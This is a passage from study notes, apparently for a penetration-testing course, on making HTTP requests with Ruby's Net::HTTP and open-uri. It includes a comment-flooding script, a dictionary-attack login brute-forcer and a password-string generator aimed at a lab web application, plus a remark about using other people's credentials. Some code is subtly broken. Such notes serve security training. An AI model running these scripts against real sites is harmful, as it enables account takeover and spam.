<span class="c1"># in this example we request the home page</span>
</code></pre></div></div>

<h4 id="using-httpget-request-object">Using Http:Get request object</h4>
<p>The <strong>net/http</strong> library provides a class For HTTP requests. its full name is <strong>Net::HttpRequest</strong>, and like HttpResponse, it wraps the request header and the request path together.</p>

<ul>
  <li>This class cannot be used directly; u have to choose one of its subclasses: Net::HTTP::(Get, Post, Head)</li>
</ul>

<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-i-request</p>

<ul>
  <li>according with the references, u can use its subclasses instances only by using the request method of Net::HTTP instances. 
// the path of the server resource we want</li>
</ul>

<p>The Net::Http::Get instance is a subclass of the HttpRequest designed to perform Get requests:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"www.elearnsecurity.com"</span><span class="p">)</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Get</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="c1"># after having both Net::HTTP and Net::HTTP:GET instances, we can use the request method.</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="uri-and-parameters">URI and parameters</h4>
<p>If u use the Net::HTTP instance to perform GET requests, u can use URI objects as parameters too.</p>

<h4 id="request-headers">Request Headers</h4>
<ul>
  <li>How to handle request headers</li>
  <li>to set our custom header, we need to use Net::HTTP instances</li>
</ul>

<h4 id="using-get-instance-method-1">Using get instance method</h4>
<p>How to change the default value of the <strong>User-Agent</strong> request header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"www.elearnsecurity.com"</span><span class="p">)</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"user-agent"</span> <span class="o">=&gt;</span> <span class="s2">"Custom user agent"</span><span class="p">}</span>
<span class="n">http</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="n">headers</span><span class="p">)</span>
<span class="c1"># we can confirm with Wireshark, that our current User-Agent contains the value that we gave = "Custom user agent"</span>
</code></pre></div></div>

<h4 id="using-httpget-request-object-1">using Http.Get request object</h4>
<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTPHeader.html</p>

<p>HttpRequest instances wraps the request header (Net::HTTPHeader) and the request path together:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"www.elearnsecurity.com"</span><span class="p">)</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Get</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="n">req</span><span class="p">[</span><span class="s1">'user-agent'</span><span class="p">]</span> <span class="o">/</span><span class="sr">/only outputs the current user-agent
req['user-agent'] = "Another custom user-agent" # modify and print the user-agent

http.request(req)
# we can check with wireshark again that our new user-agent is set correctly
</span></code></pre></div></div>

<h4 id="working-with-open-uri">Working with Open-uri</h4>
<p>GET requests can be performed more easily by using open-uri library</p>

<ul>
  <li>Open-uri supports only the GET method but there is gems (such as <strong>rest-open-uri</strong>) that extend its functionality to others verbs (like POST)</li>
</ul>

<h5 id="open-method">open method</h5>
<p>It returns a Tempfile object that encapsulates the response:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"http://www.elearnsecurity.com"</span><span class="p">)</span>
<span class="n">resp</span><span class="p">.</span><span class="nf">class</span><span class="p">.</span><span class="nf">name</span>
<span class="c1"># Output: "Tempfile"</span>
</code></pre></div></div>

<p>If u want the response body, u can use line unumerators:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span><span class="p">.</span><span class="nf">each_line</span> <span class="p">{</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">line</span> <span class="p">}</span>
</code></pre></div></div>

<p>Response headers are treated as meta information and are available using the <strong>meta</strong> attribute:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span><span class="p">.</span><span class="nf">meta</span>
<span class="c1"># headers output</span>
</code></pre></div></div>

<p>U can also use open with a block methodology. the block variable (resp) is the Tempfile created by the open:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="s2">"http://www.elearnsecurity.com"</span><span class="p">){</span> <span class="o">|</span><span class="n">resp</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">resp</span><span class="p">.</span><span class="nf">meta</span> <span class="p">}</span>
</code></pre></div></div>

<h5 id="request-headers-1">request headers</h5>
<p>With <strong>open</strong> we can specify request headers as an optional hash argument:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="s2">"http://www.elearnsecurity.com"</span><span class="p">,{</span><span class="s2">"User-Agent"</span><span class="o">=&gt;</span><span class="s2">"custom header"</span><span class="p">})</span>
</code></pre></div></div>

<p>Setting new header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">open</span><span class="p">(</span><span class="s2">"http://www.elearnsecurity.com"</span><span class="p">,</span><span class="s2">"User-Agent"</span><span class="o">=&gt;</span><span class="s2">"Test"</span><span class="p">,</span><span class="s2">"New-Header"</span><span class="o">=&gt;</span><span class="s2">"some value"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="post">POST</h3>

<h4 id="using-nethttp-post_form">Using Net::HTTP post_form</h4>
<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-c-post_form</p>

<p>The target address is the login.php resource while form parameters are user and pass:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"&lt;url of the target&gt;"</span><span class="p">)</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"user"</span><span class="o">=&gt;</span><span class="s2">"els"</span><span class="p">,</span><span class="s2">"pass"</span><span class="o">=&gt;</span><span class="s2">"els"</span><span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">post_form</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="sessions-and-cookies">Sessions and cookies</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span>
</code></pre></div></div>

<blockquote>
  <p><strong>myaccount.php</strong> its the location responder header with the destination address if the login succeds</p>
</blockquote>

<p>To see if the login using our POST succeeded. we look at the set-cookie:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span><span class="p">.</span><span class="nf">to_hash</span>
</code></pre></div></div>

<p>Now we send a GET request to the myaccount.php target using a proper cookie header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="s2">"&lt;url/myaccount.php&gt;"</span>
<span class="n">logged</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="s2">"cookie"</span><span class="o">=&gt;</span><span class="n">res</span><span class="p">[</span><span class="s1">'set-cookie'</span><span class="p">])</span>

<span class="n">logged</span><span class="p">.</span><span class="nf">each_line</span> <span class="p">{</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span> <span class="nb">print</span> <span class="n">line</span> <span class="p">}</span>
<span class="c1"># to print the response</span>
</code></pre></div></div>

<h4 id="using-httppost-request-object">Using Http::Post request object</h4>
<p>First thing is to create an Net::HTTP instance:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target</span> <span class="o">=</span> <span class="s2">"&lt;url&gt;"</span>
<span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</code></pre></div></div>

<p>Now we create a Net::HTTP::POST instance:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Post</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"/login.php"</span><span class="p">)</span>
</code></pre></div></div>

<p>We have to set the POST form values, in this case els:els</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">req</span><span class="p">.</span><span class="nf">set_form_data</span><span class="p">(</span><span class="s2">"user"</span><span class="o">=&gt;</span><span class="s2">"els"</span><span class="p">,</span><span class="s2">"pass"</span><span class="o">=&gt;</span><span class="s2">"els"</span><span class="p">)</span>
</code></pre></div></div>

<p>We now have to send the request by using the method of the Net::HTTP instance</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
<span class="c1"># we received a 'moved temporarly' response</span>
</code></pre></div></div>

<p>To print the headers, we can see the set-cookie header with the SESSION-ID which identifies the logged session:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span><span class="p">.</span><span class="nf">to_hash</span>
</code></pre></div></div>

<blockquote>
  <p>we can use this <strong>SESSION-ID</strong> as a request Cookie to perform logged requests</p>
</blockquote>

<h4 id="request-headers-2">Request Headers</h4>
<p>U can set your custom request headers with POST requests</p>

<ul>
  <li>in the logged page we can write comments</li>
  <li>
    <p>we can run the same operation in Ruby</p>
  </li>
  <li>the comments are allowed only For logged in users</li>
  <li>this implicitly means that your browser sends a cookie (as an header) that identifies your authenticated session during the POST request</li>
  <li>
    <p>therefore, we need to set the <strong>cookie</strong> header with a proper SESSION-ID value.</p>
  </li>
  <li>look at the source code to identify the form <strong>action</strong> of the page and field names</li>
  <li>in this case, action=’sendmsg_confirmation.php’, name, comment, cat</li>
</ul>

<p>We have a <strong>res</strong> variable containing the login response with the SESSION-ID in set-cookie header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span><span class="p">.</span><span class="nf">to_hash</span>
</code></pre></div></div>

<h4 id="using-post-instance-method">Using post instance method</h4>
<p>To use <strong>post</strong>, we need a Net::Http instance; the target resource address too:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target</span> <span class="o">=</span> <span class="s2">"&lt;url&gt;"</span>
<span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
</code></pre></div></div>

<p>The form we want to send if the following:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">param</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"name"</span><span class="o">=&gt;</span><span class="s2">"hello"</span><span class="p">,</span><span class="s2">"comment"</span><span class="o">=&gt;</span><span class="s2">"from ruby"</span><span class="p">,</span><span class="s2">"cat"</span><span class="o">=&gt;</span><span class="s2">"1"</span><span class="p">}</span>
<span class="c1"># the cat is if of the category</span>
</code></pre></div></div>

<p>Our <strong>post</strong> request must contain a cookie header with a valid logged SESSION-ID:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"cookie"</span><span class="o">=&gt;</span><span class="n">res</span><span class="p">[</span><span class="s1">'set-cookie'</span><span class="p">]}</span>
</code></pre></div></div>

<ul>
  <li>now we can perform the POST request</li>
  <li>it requires an encoded form data while the destination path is the action address seen before in the source code.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enc_param</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode_www_form</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
<span class="n">http</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s2">"/sendmsg_confirmation.php"</span><span class="p">,</span><span class="n">enc_param</span><span class="p">,</span><span class="n">header</span><span class="p">)</span>

<span class="c1"># we can go to the page and check if our commentary is there</span>
</code></pre></div></div>

<h4 id="using-httppost-request-object-1">Using Http::Post request object</h4>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target</span> <span class="o">=</span> <span class="s2">"&lt;url&gt;"</span>
<span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Post</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"/sendmsg_confirmation.php"</span><span class="p">)</span>
<span class="n">req</span><span class="p">.</span><span class="nf">set_form_data</span><span class="p">({</span><span class="s2">"name"</span><span class="o">=&gt;</span><span class="s2">"hello"</span><span class="p">,</span><span class="s2">"comment"</span><span class="o">=&gt;</span><span class="s2">"again from ruby"</span><span class="p">,</span><span class="s2">"cat"</span><span class="o">=&gt;</span><span class="s2">"1"</span><span class="p">})</span>
<span class="n">req</span><span class="p">[</span><span class="s1">'cookie'</span><span class="p">]</span><span class="o">=</span><span class="n">res</span><span class="p">[</span><span class="s1">'set-cookie'</span><span class="p">]</span>
<span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</code></pre></div></div>

<h5 id="example-post-flooding">Example: Post Flooding</h5>
<p>We want to write a <strong>post flooding</strong> script that sends subsequent POST request to the target in order to full the programs page (program.php) with a lot of undesired comments.</p>

<ul>
  <li>this is possible because there are no security mechanisms implemented in the web app (such as captcha). Therefore subsequent request can be automated using a script.</li>
  <li>our script takes the target address, an user name, a password and the number of comments we want to send as arguments. then the script performs the login flow and finally it uses the SESSION-ID received to send the subsequent POST comment requests.</li>
</ul>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">post_flooding</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">target</span> <span class="n">url</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">login</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">number</span> <span class="n">of</span> <span class="n">comments</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>First identify the parameters and create http instance:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'net/http'</span>
<span class="no">Target_URI</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="no">Username</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="no">Password</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="no">Max_Comments</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="nf">to_i</span>

<span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">Target_URI</span><span class="p">.</span><span class="nf">hostname</span><span class="p">)</span>
</code></pre></div></div>

<p>Perform the login process using Username and Password in order to obtain the session id from the set-cookie response header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">login_param</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode_www_form</span><span class="p">({</span><span class="s2">"user"</span><span class="o">=&gt;</span><span class="no">Username</span><span class="p">,</span> <span class="s2">"pass"</span><span class="o">=&gt;</span><span class="no">Password</span><span class="p">})</span>
<span class="n">login_res</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s2">"/login.php"</span><span class="p">,</span><span class="n">login_param</span><span class="p">)</span>
<span class="n">session_id</span> <span class="o">=</span> <span class="n">login_res</span><span class="p">[</span><span class="s1">'set-cookie'</span><span class="p">]</span>
</code></pre></div></div>

<p>Then the flooding part. we have to use the SESSION-ID received from the login process as a cookie header to be able to post any comment:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flood_parameters</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode_www_form</span><span class="p">({</span><span class="s2">"name"</span><span class="o">=&gt;</span><span class="s2">"FLOOD"</span><span class="p">,</span><span class="s2">"comment"</span><span class="o">=&gt;</span><span class="s2">"FROM RUBY"</span><span class="p">,</span><span class="s2">"cat"</span><span class="o">=&gt;</span><span class="s2">"1"</span><span class="p">})</span>
<span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="no">Max_Comments</span><span class="p">).</span><span class="nf">each</span><span class="p">{</span> 
  <span class="n">http</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s2">"/sendmsg_confirmation.php"</span><span class="p">,</span><span class="n">flood_parameters</span><span class="p">,</span><span class="s2">"cookie"</span><span class="o">=&gt;</span><span class="n">session_id</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>we used our own credentials, thats now ideal 
we can try to discover someone elses credentials in order to not expose our credentials</p>
</blockquote>

<h3 id="persistent-connections">Persistent Connections</h3>
<p>If u have to exchange a lot of information with the server (For example a multi chunk file download), its better to have a unique TCP connection.</p>

<ul>
  <li>the HTTP 1.1 protocol allows u to maintain the connection opened For subsequent request.</li>
  <li>using the <strong>start</strong> method, we can open a unique TCP stream (a unique connection and a unique handshake)</li>
</ul>

<p>→ moreover: http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html</p>

<blockquote>
  <p>Brute form login</p>
</blockquote>

<h4 id="response-identification">Response identification</h4>
<p>When the login succeeds, the server sends a <strong>moved temporarly</strong> response that points to myaccount.php. The server also sets a cookie with the SESSION-ID For the created login session:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"&lt;target login url&gt;"</span><span class="p">)</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"user"</span><span class="o">=&gt;</span><span class="s2">"els"</span><span class="p">,</span><span class="s2">"pass"</span><span class="o">=&gt;</span><span class="s2">"els"</span><span class="p">}</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">post_form</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">params</span><span class="p">)</span>
<span class="n">res</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span>
<span class="n">res</span><span class="p">[</span><span class="s1">'set-cookie'</span><span class="p">]</span>
</code></pre></div></div>

<blockquote>
  <p>if we provide wrong credentials, there is no set-cookie header and the location is the same url
so we can use these 2 info, to see if the login succeeds or not.</p>
</blockquote>

<h4 id="find-a-username">Find a UserName</h4>
<p>Scrap through the web page to find valid usernames</p>

<ul>
  <li>in this case there are logins in the comments</li>
</ul>

<h4 id="dictionary-attack">Dictionary attack</h4>
<p>The script sequentially tests each password against the same UserName and if one of these is correct, it prints it to stdout.</p>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="err">→</span> <span class="n">time</span> <span class="n">ruby</span> <span class="n">dictionary_login</span><span class="p">.</span><span class="nf">rb</span> <span class="o">&lt;</span><span class="n">url</span> <span class="n">target</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">dictionary</span> <span class="n">file</span><span class="o">&gt;</span>

<span class="nb">require</span> <span class="s1">'net/http'</span>

<span class="no">Target</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="no">User</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="no">Password_file</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

<span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="no">Target</span><span class="p">)</span>
<span class="n">params</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">"user"</span> <span class="o">=&gt;</span> <span class="no">User</span> <span class="p">}</span>
<span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">hostname</span><span class="p">)</span>
<span class="n">req</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Post</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">request_uri</span><span class="p">)</span>

<span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="no">Password_file</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
  <span class="n">real_pwd</span> <span class="o">=</span> <span class="n">file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">pwd</span><span class="o">|</span>
    <span class="n">params</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]</span> <span class="o">=</span> <span class="n">pwd</span><span class="p">.</span><span class="nf">chomp</span> <span class="c1"># Use `chomp` to remove newline characters</span>
    <span class="n">req</span><span class="p">.</span><span class="nf">set_form_data</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
    <span class="k">break</span> <span class="n">pwd</span><span class="p">.</span><span class="nf">chomp</span> <span class="k">if</span> <span class="n">res</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'myaccount.php'</span> <span class="o">&amp;&amp;</span> <span class="n">res</span><span class="p">[</span><span class="s1">'set-cookie'</span><span class="p">]</span>
  <span class="k">end</span>

  <span class="k">if</span> <span class="n">real_pwd</span><span class="p">.</span><span class="nf">is_a?</span> <span class="no">String</span>
    <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Password for '</span><span class="si">#{</span><span class="no">User</span><span class="si">}</span><span class="s2">' is: </span><span class="si">#{</span><span class="n">real_pwd</span><span class="si">}</span><span class="s2">"</span>
  <span class="k">else</span>
    <span class="nb">puts</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Password not found for '</span><span class="si">#{</span><span class="no">User</span><span class="si">}</span><span class="s2">'."</span>
  <span class="k">end</span>
<span class="k">end</span>

<span class="n">http</span><span class="p">.</span><span class="nf">finish</span> <span class="c1"># Corrected the method name</span>

</code></pre></div></div>

<h4 id="using-a-string-generator">Using a string generator</h4>
<p>If the target chooses a strong password, an attacker may not be able to discover it in a short time</p>

<p>However its a good exercise to use Ruby to generate all of the string ofa particular character input space to use in a real bruteforce scenario.</p>

<p>Input parameters:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Input_space</span> <span class="o">=</span> <span class="s1">'a'</span><span class="o">..</span><span class="s1">'z'</span>
<span class="no">Min_length</span> <span class="o">=</span> <span class="mi">1</span>
<span class="no">Max_length</span> <span class="o">=</span> <span class="mi">3</span>
</code></pre></div></div>

<p>Generates all of the strings of a specific size using the input_space characters:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">genst</span><span class="p">(</span><span class="n">st</span><span class="p">,</span><span class="n">post</span><span class="p">,</span><span class="o">&amp;</span><span class="n">block</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">block</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="n">st</span><span class="p">)</span> <span class="k">if</span> <span class="n">pos</span><span class="o">&lt;=</span><span class="mi">0</span>
  <span class="no">Input_space</span><span class="p">.</span><span class="nf">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">genst</span><span class="p">(</span><span class="n">st</span><span class="o">+</span><span class="n">x</span><span class="p">,</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">block</span><span class="p">)</span> <span class="p">}</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Start from min_length up to max_length generates all of the strings of a specific size using the previous genst:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">genallpwd</span><span class="p">(</span><span class="o">&amp;</span><span class="n">block</span><span class="p">)</span>
  <span class="p">(</span><span class="no">Min_length</span><span class="o">..</span><span class="no">Max_length</span><span class="p">).</span><span class="nf">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">l</span><span class="o">|</span> <span class="n">genst</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="n">l</span><span class="p">,</span><span class="o">&amp;</span><span class="n">block</span><span class="p">)}</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Call the genallpwd method and allows us to specify what the task is to do when a new string is generated.</p>

<p>In this case we want to print:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">genallpwd</span><span class="p">{</span> <span class="o">|</span><span class="n">pwd</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">pwd</span><span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>we can change the size For example to 4..10
and also change the input_space to every alphanumeric string</p>
</blockquote>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Input_space</span> <span class="o">=</span> <span class="p">(</span><span class="s1">'A'</span><span class="o">..</span><span class="s1">'Z'</span><span class="p">).</span><span class="nf">to_a</span><span class="o">+</span><span class="p">(</span><span class="s1">'a'</span><span class="o">..</span><span class="s1">'z'</span><span class="p">).</span><span class="nf">to_a</span><span class="o">+</span><span class="p">(</span><span class="s1">'0'</span><span class="o">..</span><span class="s1">'9'</span><span class="p">).</span><span class="nf">to_a</span>
<span class="no">Min_length</span> <span class="o">=</span> <span class="mi">4</span>
<span class="no">Max_length</span> <span class="o">=</span> <span class="mi">10</span>
</code></pre></div></div>

<blockquote>
  <p>we can set the target url and username as parameters and try to break into the account with the generates characters
it takes some time to use this technique, even if its a short password</p>
</blockquote>

<h3 id="https">HTTPS</h3>
<p>Net::HTTP allows us to handle also https connections. we only need to change the connection establishment, the rest is the same</p>

<ul>
  <li>create an SSL connection with Net::HTTP instance</li>
</ul>

<p>Specify a correct SSL port (usually 443):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"http://members.elearnsecurity.com"</span><span class="p">)</span>
<span class="n">url</span><span class="p">.</span><span class="nf">host</span> <span class="sr">//</span><span class="n">the</span> <span class="n">site</span>
<span class="n">url</span><span class="p">.</span><span class="nf">port</span> <span class="sr">//</span><span class="mi">443</span>
<span class="n">https</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">host</span><span class="p">,</span><span class="n">url</span><span class="p">.</span><span class="nf">port</span><span class="p">)</span>
</code></pre></div></div>

<p>Set the connection to use SSL:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="p">.</span><span class="nf">use_ssl</span> <span class="o">=</span> <span class="kp">true</span>
</code></pre></div></div>

<p>Now we can use all of the instance methods previously seen.</p>

<p>For example, a simple GET request to the home page path:</p>
